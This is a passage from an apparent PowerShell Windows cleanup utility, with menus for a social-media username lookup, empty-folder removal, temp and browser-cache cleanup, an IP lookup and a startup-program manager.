    Show-Header

    do {
        Write-Host "========= USERNAME TRACKER =========" -ForegroundColor Cyan
        Write-Host "Track username across social media platforms" -ForegroundColor Yellow
        Write-Host ""
        Write-Host "1. Search for Username" -ForegroundColor White
        Write-Host "2. View Platform List" -ForegroundColor White
        Write-Host "3. Batch Username Search" -ForegroundColor White
        Write-Host "4. Help & Information" -ForegroundColor White
        Write-Host "0. Return to Main Menu" -ForegroundColor Gray

        $choice = Read-Host "`nEnter choice (0-4)"

        switch ($choice) {
            '1' {
                $username = Read-Host "`nEnter username to search"
                if ($username.Trim() -ne '') {
                    Start-UsernameTracker -Username $username.Trim()
                    Pause-For-User
                } else {
                    Write-Host "Please enter a valid username." -ForegroundColor Red
                }
            }

            '2' {
                Write-Host "`n========= SUPPORTED PLATFORMS =========" -ForegroundColor Cyan
                $platforms = @("GitHub", "Instagram", "Twitter", "Facebook", "YouTube", "TikTok", 
                             "LinkedIn", "Reddit", "Pinterest", "Snapchat", "Tumblr", "DeviantArt",
                             "Behance", "Dribbble", "Medium", "Twitch", "Discord", "Telegram",
                             "Spotify", "SoundCloud", "Steam", "Last.fm")

                $count = 1
                foreach ($platform in $platforms) {
                    Write-Host "$count. $platform" -ForegroundColor White
                    $count++
                    if ($count % 5 -eq 1) { Write-Host "" }
                }
                Write-Host "=======================================" -ForegroundColor Cyan
                Pause-For-User
            }

            '3' {
                Write-Host "`nBatch Username Search" -ForegroundColor Yellow
                $usernames = Read-Host "Enter usernames separated by commas"
                if ($usernames.Trim() -ne '') {
                    $usernameList = $usernames -split "," | ForEach-Object { $_.Trim() }
                    foreach ($user in $usernameList) {
                        if ($user -ne '') {
                            Write-Host "`n" + ("=" * 50) -ForegroundColor Gray
                            Start-UsernameTracker -Username $user
                            Write-Host ("=" * 50) -ForegroundColor Gray
                        }
                    }
                    Pause-For-User
                }
            }

            '4' {
                Write-Host "`n========= USERNAME TRACKER HELP =========" -ForegroundColor Cyan
                Write-Host "This tool searches for usernames across social media platforms:" -ForegroundColor White
                Write-Host "• Social Media (Instagram, Twitter, Facebook, TikTok)" -ForegroundColor Gray
                Write-Host "• Professional (LinkedIn, GitHub, Behance)" -ForegroundColor Gray
                Write-Host "• Gaming (Steam, Twitch)" -ForegroundColor Gray
                Write-Host "• Creative (YouTube, SoundCloud, DeviantArt)" -ForegroundColor Gray
                Write-Host ""
                Write-Host "Color coding:" -ForegroundColor White
                Write-Host "[+] Found - Profile exists" -ForegroundColor Green
                Write-Host "[-] Not Found - Profile doesn't exist" -ForegroundColor Red
                Write-Host "[!] Error - Unable to check" -ForegroundColor Yellow
                Write-Host "==========================================" -ForegroundColor Cyan
                Pause-For-User
            }

            '0' { return }
            default { Write-Host "Invalid choice." -ForegroundColor Red }
        }

    } while ($choice -ne '0')
}

#region EMPTY FOLDERS REMOVAL FUNCTIONS
# ============================================================================
# EMPTY FOLDERS REMOVAL FUNCTIONS
# ============================================================================

function Find-EmptyFolders {
    <#
    .SYNOPSIS
        Scans specified path for empty directories
    .DESCRIPTION
        Recursively searches for directories that contain no files or subdirectories
    .PARAMETER Path
        Root path to scan for empty folders
    .PARAMETER Recursive
        Switch to enable recursive scanning of subdirectories
    .PARAMETER ExcludePaths
        Array of paths to exclude from scanning
    .RETURNS
        Array of empty folder paths found
    #>
    param(
        [string]$Path,
        [switch]$Recursive,
        [array]$ExcludePaths = @()
    )

    Write-Host "Scanning for empty folders in: $Path" -ForegroundColor Cyan

    # Default exclusions for system folders
    $defaultExclusions = @(
        "C:\Windows",
        "C:\Program Files",
        "C:\Program Files (x86)",
        "C:\ProgramData",
        "$env:APPDATA\Microsoft",
        "$env:LOCALAPPDATA\Microsoft"
    )

    $allExclusions = $ExcludePaths + $defaultExclusions
    $emptyFolders = @()

    try {
        if ($Recursive) {
            $folders = Get-ChildItem -Path $Path -Directory -Recurse -ErrorAction SilentlyContinue
        } else {
            $folders = Get-ChildItem -Path $Path -Directory -ErrorAction SilentlyContinue
        }

        $totalFolders = $folders.Count
        $current = 0

        foreach ($folder in $folders) {
            $current++
            $percentComplete = if ($totalFolders -gt 0) { [Math]::Round(($current / $totalFolders) * 100) } else { 0 }
            Write-Progress -Activity "Scanning for empty folders" -Status "Checking: $($folder.Name)" -PercentComplete $percentComplete

            # Check if folder should be excluded
            $shouldExclude = $false
            foreach ($exclusion in $allExclusions) {
                if ($folder.FullName -like "$exclusion*") {
                    $shouldExclude = $true
                    break
                }
            }

            if (-not $shouldExclude) {
                try {
                    # Check if folder is truly empty (no files or subdirectories)
                    $contents = Get-ChildItem -Path $folder.FullName -Force -ErrorAction SilentlyContinue

                    if ($contents.Count -eq 0) {
                        $emptyFolders += [PSCustomObject]@{
                            Path = $folder.FullName
                            Name = $folder.Name
                            Parent = $folder.Parent.FullName
                            CreationTime = $folder.CreationTime
                            LastWriteTime = $folder.LastWriteTime
                        }
                    }
                } catch {
                    # Skip folders that cannot be accessed
                    continue
                }
            }
        }

        Write-Progress -Activity "Scanning for empty folders" -Completed

    } catch {
        Write-Host "Error scanning path: $_" -ForegroundColor Red
        return @()
    }

    return $emptyFolders
}

function Remove-EmptyFolders {
    <#
    .SYNOPSIS
        Removes specified empty folders from the system
    .DESCRIPTION
        Safely removes empty directories with confirmation and logging
    .PARAMETER EmptyFolders
        Array of empty folder objects to remove
    .PARAMETER Force
        Switch to remove without individual confirmations
    .RETURNS
        Number of folders successfully removed
    #>
    param(
        [array]$EmptyFolders,
        [switch]$Force
    )

    if ($EmptyFolders.Count -eq 0) {
        Write-Host "No empty folders to remove." -ForegroundColor Yellow
        return 0
    }

    $removedCount = 0
    $failedCount = 0

    foreach ($folder in $EmptyFolders) {
        try {
            # Double-check that folder is still empty before removal
            if (Test-Path $folder.Path) {
                $contents = Get-ChildItem -Path $folder.Path -Force -ErrorAction SilentlyContinue

                if ($contents.Count -eq 0) {
                    if (-not $Force) {
                        $confirm = Read-Host "Remove empty folder: $($folder.Path)? (y/n/a for all)"
                        if ($confirm -eq 'a' -or $confirm -eq 'A') {
                            $Force = $true
                        } elseif ($confirm -ne 'y' -and $confirm -ne 'Y') {
                            continue
                        }
                    }

                    Remove-Item -Path $folder.Path -Force -ErrorAction Stop
                    Write-Host "[SUCCESS] Removed: $($folder.Path)" -ForegroundColor Green
                    $removedCount++
                } else {
                    Write-Host "[SKIP] No longer empty: $($folder.Path)" -ForegroundColor Yellow
                }
            } else {
                Write-Host "[SKIP] Already removed: $($folder.Path)" -ForegroundColor Gray
            }
        } catch {
            Write-Host "[ERROR] Failed to remove: $($folder.Path) - $($_.Exception.Message)" -ForegroundColor Red
            $failedCount++
        }
    }

    Write-Host ""
    Write-Host "========= REMOVAL SUMMARY =========" -ForegroundColor Cyan
    Write-Host "Successfully removed: $removedCount folders" -ForegroundColor Green
    Write-Host "Failed to remove: $failedCount folders" -ForegroundColor Red
    Write-Host "===================================" -ForegroundColor Cyan

    return $removedCount
}

function Show-EmptyFoldersManager {
    <#
    .SYNOPSIS
        Main interface for the Empty Folders Manager
    .DESCRIPTION
        Provides user interface for scanning and removing empty folders
    #>

    Clear-Host
    Show-Header

    do {
        Write-Host "========= EMPTY FOLDERS MANAGER =========" -ForegroundColor Cyan
        Write-Host "Find and remove empty directories to free up space" -ForegroundColor Yellow
        Write-Host ""
        Write-Host "1. Quick scan " -NoNewline -ForegroundColor White
        Write-Host "( Common user folders )" -ForegroundColor Magenta
        Write-Host "2. Scan specific folder" -ForegroundColor White
        Write-Host "3. Advanced scan " -NoNewline -ForegroundColor White
        Write-Host "( Custom path with options )" -ForegroundColor Magenta
        Write-Host "4. Scan entire system " -NoNewline -ForegroundColor White
        Write-Host "( May take long time )" -ForegroundColor Magenta
        Write-Host "5. Help & Information" -ForegroundColor White
        Write-Host "0. Return to Main Menu" -ForegroundColor Gray

        $choice = Read-Host "`nEnter choice (0-5)"

        switch ($choice) {
            '1' {
                # Quick scan - common user folders
                Write-Host "`nQuick Scan - Common User Folders" -ForegroundColor Cyan
                Write-Host "Scanning common folders for empty directories..." -ForegroundColor Yellow

                $commonFolders = @(
                    "$env:USERPROFILE\Downloads",
                    "$env:USERPROFILE\Desktop",
                    "$env:USERPROFILE\Documents", 
                    "$env:USERPROFILE\Pictures",
                    "$env:USERPROFILE\Videos",
                    "$env:USERPROFILE\Music",
                    "$env:TEMP",
                    "$env:LOCALAPPDATA\Temp"
                )

                $allEmptyFolders = @()
                foreach ($folder in $commonFolders) {
                    if (Test-Path $folder) {
                        Write-Host "  Scanning: $folder" -ForegroundColor Gray
                        $emptyFolders = Find-EmptyFolders -Path $folder -Recursive
                        $allEmptyFolders += $emptyFolders
                    }
                }

                if ($allEmptyFolders.Count -gt 0) {
                    Write-Host "`nFound $($allEmptyFolders.Count) empty folders:" -ForegroundColor Yellow
                    foreach ($folder in $allEmptyFolders) {
                        Write-Host "  $($folder.Path)" -ForegroundColor White
                    }

                    $removeChoice = Read-Host "`nRemove all empty folders? (y/n)"
                    if ($removeChoice -eq 'y' -or $removeChoice -eq 'Y') {
                        $removed = Remove-EmptyFolders -EmptyFolders $allEmptyFolders -Force
                        Write-Host "Removed $removed empty folders." -ForegroundColor Green
                    }
                } else {
                    Write-Host "`nNo empty folders found in common locations!" -ForegroundColor Green
                }
            }

            '2' {
                # Scan specific folder
                $folderPath = Read-Host "`nEnter folder path to scan"
                if (Test-Path $folderPath) {
                    $recursive = Read-Host "Scan subdirectories recursively? (y/n)"
                    $isRecursive = $recursive -eq 'y' -or $recursive -eq 'Y'

                    Write-Host "Scanning: $folderPath" -ForegroundColor Yellow
                    $emptyFolders = if ($isRecursive) {
                        Find-EmptyFolders -Path $folderPath -Recursive
                    } else {
                        Find-EmptyFolders -Path $folderPath
                    }

                    if ($emptyFolders.Count -gt 0) {
                        Write-Host "`nFound $($emptyFolders.Count) empty folders:" -ForegroundColor Yellow
                        foreach ($folder in $emptyFolders) {
                            Write-Host "  $($folder.Path)" -ForegroundColor White
                        }

                        $removeChoice = Read-Host "`nRemove empty folders? (y/n)"
                        if ($removeChoice -eq 'y' -or $removeChoice -eq 'Y') {
                            $removed = Remove-EmptyFolders -EmptyFolders $emptyFolders
                        }
                    } else {
                        Write-Host "`nNo empty folders found!" -ForegroundColor Green
                    }
                } else {
                    Write-Host "Folder not found: $folderPath" -ForegroundColor Red
                }
            }

            '3' {
                # Advanced scan with options
                Write-Host "`nAdvanced Empty Folder Scan" -ForegroundColor Cyan
                $folderPath = Read-Host "Enter folder path to scan"

                if (Test-Path $folderPath) {
                    $recursive = Read-Host "Scan subdirectories recursively? (y/n)"
                    $isRecursive = $recursive -eq 'y' -or $recursive -eq 'Y'

                    Write-Host "Enter paths to exclude (press Enter to skip):" -ForegroundColor Yellow
                    $exclusions = @()
                    do {
                        $excludePath = Read-Host "Exclude path (or Enter to finish)"
                        if ($excludePath.Trim() -ne '') {
                            $exclusions += $excludePath.Trim()
                        }
                    } while ($excludePath.Trim() -ne '')

                    Write-Host "Scanning with advanced options..." -ForegroundColor Yellow
                    $emptyFolders = if ($isRecursive) {
                        Find-EmptyFolders -Path $folderPath -Recursive -ExcludePaths $exclusions
                    } else {
                        Find-EmptyFolders -Path $folderPath -ExcludePaths $exclusions
                    }

                    if ($emptyFolders.Count -gt 0) {
                        Write-Host "`nFound $($emptyFolders.Count) empty folders:" -ForegroundColor Yellow

                        # Group by parent folder
                        $grouped = $emptyFolders | Group-Object Parent
                        foreach ($group in $grouped) {
                            Write-Host "`nIn folder: $($group.Name)" -ForegroundColor Cyan
                            foreach ($folder in $group.Group) {
                                Write-Host "  - $($folder.Name)" -ForegroundColor White
                            }
                        }

                        Write-Host "`nRemoval options:" -ForegroundColor Yellow
                        Write-Host "1. Remove all empty folders" -ForegroundColor White
                        Write-Host "2. Remove selectively" -ForegroundColor White
                        Write-Host "3. Export list to file" -ForegroundColor White
                        Write-Host "0. Skip removal" -ForegroundColor Gray

                        $removeChoice = Read-Host "Enter choice (0-3)"
                        switch ($removeChoice) {
                            '1' {
                                $removed = Remove-EmptyFolders -EmptyFolders $emptyFolders -Force
                            }
                            '2' {
                                $removed = Remove-EmptyFolders -EmptyFolders $emptyFolders
                            }
                            '3' {
                                $exportPath = "$env:USERPROFILE\Desktop\EmptyFolders_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
                                $emptyFolders | ForEach-Object { $_.Path } | Out-File -FilePath $exportPath -Encoding UTF8
                                Write-Host "List exported to: $exportPath" -ForegroundColor Green
                            }
                        }
                    } else {
                        Write-Host "`nNo empty folders found!" -ForegroundColor Green
                    }
                } else {
                    Write-Host "Folder not found: $folderPath" -ForegroundColor Red
                }
            }

            '4' {
                # Full system scan
                Write-Host "`nFull System Empty Folder Scan" -ForegroundColor Red
                Write-Host "WARNING: This will scan the entire system and may take a very long time!" -ForegroundColor Yellow
                Write-Host "It's recommended to use Quick Scan or Specific Folder Scan instead." -ForegroundColor Yellow

                $confirm = Read-Host "Continue with full system scan? (type 'YES' to confirm)"
                if ($confirm -eq 'YES') {
                    Write-Host "Starting full system scan..." -ForegroundColor Red
                    Write-Host "This may take 30+ minutes depending on your system..." -ForegroundColor Yellow

                    $emptyFolders = Find-EmptyFolders -Path "C:\" -Recursive

                    if ($emptyFolders.Count -gt 0) {
                        Write-Host "`nFound $($emptyFolders.Count) empty folders system-wide" -ForegroundColor Yellow

                        # Show summary by drive/location
                        $summary = $emptyFolders | Group-Object { Split-Path $_.Path -Qualifier }
                        foreach ($group in $summary) {
                            Write-Host "Drive $($group.Name): $($group.Count) empty folders" -ForegroundColor White
                        }

                        $removeChoice = Read-Host "`nRemove all empty folders? (y/n)"
                        if ($removeChoice -eq 'y' -or $removeChoice -eq 'Y') {
                            Write-Host "Removing empty folders..." -ForegroundColor Red
                            $removed = Remove-EmptyFolders -EmptyFolders $emptyFolders -Force
                        }
                    } else {
                        Write-Host "`nNo empty folders found on the system!" -ForegroundColor Green
                    }
                } else {
                    Write-Host "Full system scan cancelled." -ForegroundColor Yellow
                }
            }

            '5' {
                # Help & Information
                Write-Host "`n========= EMPTY FOLDERS HELP =========" -ForegroundColor Cyan
                Write-Host "This tool finds and removes empty directories to:" -ForegroundColor White
                Write-Host "• Free up disk space and inodes" -ForegroundColor Gray
                Write-Host "• Clean up folder structure" -ForegroundColor Gray  
                Write-Host "• Remove leftover directories from uninstalled programs" -ForegroundColor Gray
                Write-Host "• Improve file system organization" -ForegroundColor Gray
                Write-Host ""
                Write-Host "Scan Options:" -ForegroundColor Yellow
                Write-Host "Quick Scan - Scans common user folders (fastest)" -ForegroundColor White
                Write-Host "Specific Folder - Scans chosen folder with options" -ForegroundColor White
                Write-Host "Advanced Scan - Custom path with exclusion options" -ForegroundColor White
                Write-Host "System Scan - Full system scan (slowest, most thorough)" -ForegroundColor White
                Write-Host ""
                Write-Host "Safety Features:" -ForegroundColor Yellow
                Write-Host "• Excludes system and program folders by default" -ForegroundColor Gray
                Write-Host "• Double-checks folders are empty before removal" -ForegroundColor Gray
                Write-Host "• Provides confirmation options" -ForegroundColor Gray
                Write-Host "• Logs all operations" -ForegroundColor Gray
                Write-Host "=======================================" -ForegroundColor Cyan
                Pause-For-User
            }

            '0' { return }
            default { Write-Host "Invalid choice." -ForegroundColor Red }
        }

        if ($choice -ne '0' -and $choice -ne '5') {
            Pause-For-User
        }

    } while ($choice -ne '0')
}
#endregion
#endregion

#region SYSTEM STARTUP & EXTERNAL TOOLS
# ============================================================================
# SYSTEM STARTUP & EXTERNAL TOOLS
# ============================================================================

Show-Header

do {
    Write-Host ""
    Write-Host "What would you like to do?" -ForegroundColor Cyan
    Write-Host "1. Clear Temporary Files " -NoNewline -ForegroundColor White
    Write-Host "( Choose Folders )" -ForegroundColor Magenta
    Write-Host "2. Do Nothing " -NoNewline -ForegroundColor White
    Write-Host "( Exit )" -ForegroundColor Magenta
    Write-Host "3. Full Cleanup " -NoNewline -ForegroundColor White
    Write-Host "( Temp, Local Temp, Windows Temp, Prefetch )" -ForegroundColor Magenta
    Write-Host "4. Clear Browser Cache " -NoNewline -ForegroundColor White
    Write-Host "( Firefox, Chrome, Edge )" -ForegroundColor Magenta
    Write-Host "5. Clear Recycle Bin" -ForegroundColor White
    Write-Host "6. Memory Optimizer " -NoNewline -ForegroundColor White
    Write-Host "( Clear Cached Memory )" -ForegroundColor Magenta
    Write-Host "7. Get Public IP Address with Details" -ForegroundColor White
    Write-Host "8. Startup Manager " -NoNewline -ForegroundColor White
    Write-Host "( Enable/Disable Startup Programs )" -ForegroundColor Magenta
    Write-Host "9. Advanced Program Uninstaller" -ForegroundColor White
    Write-Host "10. Complete App Remover " -NoNewline -ForegroundColor White
    Write-Host "( Like Revo Uninstaller )" -ForegroundColor Magenta
    Write-Host "11. Duplicate File Finder " -NoNewline -ForegroundColor White
    Write-Host "( Find & Remove Duplicates )" -ForegroundColor Magenta
    Write-Host "12. System Information " -NoNewline -ForegroundColor White
    Write-Host "( Hardware & Software Details )" -ForegroundColor Magenta
    Write-Host "13. Username Tracker " -NoNewline -ForegroundColor White
    Write-Host "( Find Usernames Across Platforms )" -ForegroundColor Magenta
    Write-Host "14. Empty Folders Removal " -NoNewline -ForegroundColor White
    Write-Host "( Find & Remove Empty Directories )" -ForegroundColor Magenta
    $choice = Read-Host "`nEnter 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 or 0 to exit"
    if ($choice -eq '0') { break }

    switch ($choice) {
        
        #region OPTION 1 - TEMPORARY FILES CLEANUP
        '1' {
            # Clear Temporary Files - User selects specific folders
            Write-Host ""
            Write-Host "Select folders to clear (or enter 0 to return to main menu):" -ForegroundColor Cyan
            Write-Host "1. TEMP folder" -ForegroundColor Green
            Write-Host "2. Local Temp" -ForegroundColor Green
            Write-Host "3. Windows Temp" -ForegroundColor Green
            Write-Host "4. Prefetch" -ForegroundColor Green
            $selection = Read-Host "Enter numbers separated by commas (e.g., 1,3,4) or 0 to return"
            if ($selection -eq '0') { continue }
            $selectedIndexes = $selection -split "," | ForEach-Object { $_.Trim() }
            $folders = @()
            foreach ($i in $selectedIndexes) {
                switch ($i) {
                    "1" { $folders += $env:TEMP }
                    "2" { $folders += "$env:USERPROFILE\AppData\Local\Temp" }
                    "3" { $folders += "C:\Windows\Temp" }
                    "4" { $folders += "C:\Windows\Prefetch" }
                }
            }
            if ($folders.Count -eq 0) {
                Write-Host "No folders selected. Returning to menu." -ForegroundColor Yellow
                Pause-For-User
                break
            }
            Write-Host "Starting cleanup in 3 seconds..." -ForegroundColor Magenta
            Start-Sleep -Seconds 3
            $startTime = Get-Date
            $spaceBefore = (Get-PSDrive C).Free
            Write-Host "Free space before cleanup: $([math]::Round($spaceBefore/1MB,2)) MB" -ForegroundColor Cyan
            $totalDeleted = 0
            foreach ($path in $folders) {
                if (Test-Path $path) {
                    $items = Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue
                    $count = $items.Count
                    $progress = 0
                    foreach ($item in $items) {
                        if (Test-Path $item.FullName) {
                            try { Remove-Item $item.FullName -Force -Recurse -ErrorAction SilentlyContinue } catch {}
                            $progress++
                            $totalDeleted++
                            Write-Progress -Activity "Clearing $path" -Status "$progress of $count files deleted" -PercentComplete (($progress/$count)*100)
                        }
                    }
                }
            }
            $spaceAfter = (Get-PSDrive C).Free
            $endTime = Get-Date
            $duration = ($endTime - $startTime).TotalSeconds
            Write-Host "Temporary files cleared." -ForegroundColor Green
            Write-Host "Free space after cleanup: $([math]::Round($spaceAfter/1MB,2)) MB" -ForegroundColor Cyan
            $spaceFreed = ($spaceAfter - $spaceBefore) / 1MB
            Write-Host ""
            Write-Host "========= Cleanup Report =========" -ForegroundColor Cyan
            Write-Host "Files deleted: $totalDeleted" -ForegroundColor Yellow
            Write-Host "Space freed : $([math]::Round($spaceFreed,2)) MB" -ForegroundColor Yellow
            Write-Host "Time taken  : $([math]::Round($duration,2)) seconds" -ForegroundColor Yellow
            Write-Host "==================================" -ForegroundColor Cyan
            Pause-For-User
        }
        #endregion

        #region OPTION 2 - EXIT APPLICATION
        '2' {
            # Exit application with friendly message
            Write-Host "Nothing done. Have a comfy day! :)" -ForegroundColor Green
            break
        }
        #endregion

        #region OPTION 3 - FULL CLEANUP
        '3' {
            Write-Host "You can enter 0 at any time to return to the main menu." -ForegroundColor Yellow
            $folders = @(
                $env:TEMP, 
                "$env:USERPROFILE\AppData\Local\Temp", 
                "C:\Windows\Temp", 
                "C:\Windows\Prefetch"
            )
            $cancel = $false
            foreach ($path in $folders) {
                if ($cancel) { break }
                if (Test-Path $path) {
                    $items = Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue
                    $count = $items.Count
                    $progress = 0
                    foreach ($item in $items) {
                        if (Test-Path $item.FullName) {
                            # Check for cancel
                            if ($Host.UI.RawUI.KeyAvailable) {
                                $key = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
                                if ($key.Character -eq '0') { $cancel = $true; break }
                            }
                            try { Remove-Item $item.FullName -Force -Recurse -ErrorAction SilentlyContinue } catch {}
                            $progress++
                            $totalDeleted++
                            Write-Progress -Activity "Clearing $path" -Status "$progress of $count files deleted" -PercentComplete (($progress/$count)*100)
                        }
                    }
                }
            }
            if ($cancel) {
                Write-Host "Operation cancelled. Returning to main menu." -ForegroundColor Yellow
                continue
            }
            $spaceAfter = (Get-PSDrive C).Free
            $endTime = Get-Date
            $duration = ($endTime - $startTime).TotalSeconds
            Write-Host "Full cleanup done." -ForegroundColor Green
            Write-Host "Free space after cleanup: $([math]::Round($spaceAfter/1MB,2)) MB" -ForegroundColor Cyan
            $spaceFreed = ($spaceAfter - $spaceBefore) / 1MB
            Write-Host ""
            Write-Host "========= Cleanup Report =========" -ForegroundColor Cyan
            Write-Host "Files deleted: $totalDeleted" -ForegroundColor Yellow
            Write-Host "Space freed : $([math]::Round($spaceFreed,2)) MB" -ForegroundColor Yellow
            Write-Host "Time taken  : $([math]::Round($duration,2)) seconds" -ForegroundColor Yellow
            Write-Host "==================================" -ForegroundColor Cyan
            Pause-For-User
        }
        #endregion

        #region OPTION 4 - BROWSER CACHE CLEANUP
        '4' {
            Write-Host ""
            Write-Host "Select browser to clear cache (or enter 0 to return to main menu):" -ForegroundColor Cyan
            Write-Host "1. Chrome" -ForegroundColor Green
            Write-Host "2. Edge" -ForegroundColor Green
            Write-Host "3. Firefox" -ForegroundColor Green
            $browserChoice = Read-Host "Enter 1, 2, 3 or 0 to return"
            if ($browserChoice -eq '0') { continue }
            switch ($browserChoice) {
                "1" {
                    $chromeCache = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache"
                    if (Test-Path $chromeCache) { 
                        Remove-Item $chromeCache\* -Recurse -Force -ErrorAction SilentlyContinue 
                        Write-Host "Chrome cache cleared." -ForegroundColor Green
                    } else {
                        Write-Host "Chrome cache not found." -ForegroundColor Yellow
                    }
                }
                "2" {
                    $edgeCache = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache"
                    if (Test-Path $edgeCache) { 
                        Remove-Item $edgeCache\* -Recurse -Force -ErrorAction SilentlyContinue 
                        Write-Host "Edge cache cleared." -ForegroundColor Green
                    } else {
                        Write-Host "Edge cache not found." -ForegroundColor Yellow
                    }
                }
                "3" {
                    $firefoxCache = "$env:APPDATA\Mozilla\Firefox\Profiles"
                    $cacheItems = Get-ChildItem $firefoxCache -Recurse -Include cache2 -ErrorAction SilentlyContinue
                    if ($cacheItems) {
                        $cacheItems | ForEach-Object {
                            Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
                        }
                        Write-Host "Firefox cache cleared." -ForegroundColor Green
                    } else {
                        Write-Host "Firefox cache not found." -ForegroundColor Yellow
                    }
                }
                default { Write-Host "No valid browser selected." -ForegroundColor Yellow }
            }
            Pause-For-User
        }
        '5' {
            Write-Host "You can enter 0 to return to the main menu." -ForegroundColor Yellow
            $recycleInput = Read-Host "Press Enter to clear all recycle bins or 0 to return"
            if ($recycleInput -eq '0') { continue }
            $drives = Get-PSDrive -PSProvider FileSystem | Select-Object -ExpandProperty Name
            foreach ($drive in $drives) {
                try {
                    Clear-RecycleBin -DriveLetter $drive -Force -ErrorAction SilentlyContinue
                } catch {}
            }
            Write-Host "Recycle Bin cleared." -ForegroundColor Green
            Pause-For-User
        }
        '6' {
            Write-Host "You can enter 0 to return to the main menu." -ForegroundColor Yellow
            $memInput = Read-Host "Press Enter to optimize memory or 0 to return"
            if ($memInput -eq '0') { continue }
            Write-Host "Optimizing memory..." -ForegroundColor Cyan
            [System.GC]::Collect()
            [System.GC]::WaitForPendingFinalizers()
            Write-Host "Memory optimization completed." -ForegroundColor Green
            Pause-For-User
        }
        '7' {
            Write-Host "You can enter 0 to return to the main menu." -ForegroundColor Yellow
            $ip = Read-Host "Enter the IP address you want to lookup (leave blank for your own IP, or 0 to return)"
            if ($ip -eq '0') { continue }
            if ([string]::IsNullOrWhiteSpace($ip)) {
                $url = "https://ipinfo.io/json"
            } else {
                $url = "https://ipinfo.io/$ip/json"
            }
            try {
                $response = Invoke-RestMethod -Uri $url -ErrorAction Stop
                Write-Host "========= Public IP Information =========" -ForegroundColor Cyan
                Write-Host "IP Address   : $($response.ip)" -ForegroundColor Yellow
                Write-Host "Hostname     : $($response.hostname)" -ForegroundColor Yellow
                Write-Host "City         : $($response.city)" -ForegroundColor Yellow
                Write-Host "Region       : $($response.region)" -ForegroundColor Yellow
                Write-Host "Country      : $($response.country)" -ForegroundColor Yellow
                Write-Host "Location     : $($response.loc)" -ForegroundColor Yellow
                Write-Host "Organization : $($response.org)" -ForegroundColor Yellow
                Write-Host "Postal Code  : $($response.postal)" -ForegroundColor Yellow
                Write-Host "=========================================" -ForegroundColor Cyan
            } catch {
                Write-Host "Failed to retrieve public IP information: $_" -ForegroundColor Red
            }
            Pause-For-User
        }
        '8' {
            Write-Host "`nStartup Manager" -ForegroundColor Cyan
            Write-Host "===============" -ForegroundColor Cyan
            Write-Host "Scanning startup programs..." -ForegroundColor Yellow

            $startupItems = @()

            # Get startup items from registry
            $regPaths = @(
                'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
                'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run',
                'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
            )

            foreach ($regPath in $regPaths) {
                if (Test-Path $regPath) {
                    try {
                        Get-ItemProperty $regPath -ErrorAction SilentlyContinue | ForEach-Object {
                            $_.PSObject.Properties | Where-Object { $_.Name -ne 'PSPath' -and $_.Name -ne 'PSParentPath' -and $_.Name -ne 'PSChildName' -and $_.Name -ne 'PSDrive' -and $_.Name -ne 'PSProvider' } | ForEach-Object {
                                $startupItems += [PSCustomObject]@{
                                    Name = $_.Name
                                    Command = $_.Value
                                    Location = if ($regPath -like '*HKLM*') { 'System' } else { 'User' }
                                    RegPath = $regPath
                                    Status = 'Enabled'
                                }
                            }
                        }
                    } catch {}
                }
            }

            # Get startup folder items
            $startupFolders = @(
                "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
                "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
            )

            foreach ($folder in $startupFolders) {
                if (Test-Path $folder) {
                    Get-ChildItem $folder -ErrorAction SilentlyContinue | ForEach-Object {
                        $startupItems += [PSCustomObject]@{
                            Name = $_.BaseName
                            Command = $_.FullName
                            Location = if ($folder -like "*ProgramData*") { 'System Folder' } else { 'User Folder' }
                            RegPath = $folder
                            Status = 'Enabled'
                        }
                    }
                }
            }

            if ($startupItems.Count -eq 0) {
                Write-Host "No startup programs found." -ForegroundColor Yellow
                Pause-For-User
                continue
            }

            Write-Host "Found $($startupItems.Count) startup programs" -ForegroundColor Green
            Write-Host ""

            do {
                Write-Host "Startup Manager Options:" -ForegroundColor Cyan
                Write-Host "1. View all startup programs" -ForegroundColor Green
                Write-Host "2. Disable startup program" -ForegroundColor Red
                Write-Host "3. Enable startup program" -ForegroundColor Green
                Write-Host "4. Search startup programs" -ForegroundColor Blue
                Write-Host "5. Backup startup settings" -ForegroundColor Yellow
                Write-Host "0. Return to main menu" -ForegroundColor Gray

                $startupChoice = Read-Host "`nEnter choice (0-5)"

                switch ($startupChoice) {
                    '1' {
                        # View all startup programs
                        Write-Host "`nStartup Programs:" -ForegroundColor Cyan
                        Write-Host ("=" * 80) -ForegroundColor Cyan
                        Write-Host ("{0,-3} {1,-30} {2,-15} {3,-10} {4}" -f "No.", "Program Name", "Location", "Status", "Command") -ForegroundColor Yellow
                        Write-Host ("-" * 80) -ForegroundColor Gray

                        for ($i = 0; $i -lt $startupItems.Count; $i++) {
                            $item = $startupItems[$i]
                            $command = if ($item.Command.Length -gt 30) { $item.Command.Substring(0, 27) + "..." } else { $item.Command }
                            Write-Host ("{0,-3} {1,-30} {2,-15} {3,-10} {4}" -f ($i+1), $item.Name, $item.Location, $item.Status, $command) -ForegroundColor White
                        }

                        $selection = Read-Host "`nEnter program number for details (or 0 to return)"
                        if ($selection -ne '0') {
                            $index = [int]$selection - 1
                            if ($index -ge 0 -and $index -lt $startupItems.Count) {
                                $selectedItem = $startupItems[$index]
                                Write-Host "`nProgram Details:" -ForegroundColor Cyan
                                Write-Host "Name: $($selectedItem.Name)" -ForegroundColor White
                                Write-Host "Command: $($selectedItem.Command)" -ForegroundColor White
                                Write-Host "Location: $($selectedItem.Location)" -ForegroundColor White
                                Write-Host "Registry Path: $($selectedItem.RegPath)" -ForegroundColor White
                                Write-Host "Status: $($selectedItem.Status)" -ForegroundColor White
                            }
                        }
                    }

                    '2' {
                        # Disable startup program
                        Write-Host "`nSelect program to DISABLE:" -ForegroundColor Red
                        for ($i = 0; $i -lt $startupItems.Count; $i++) {
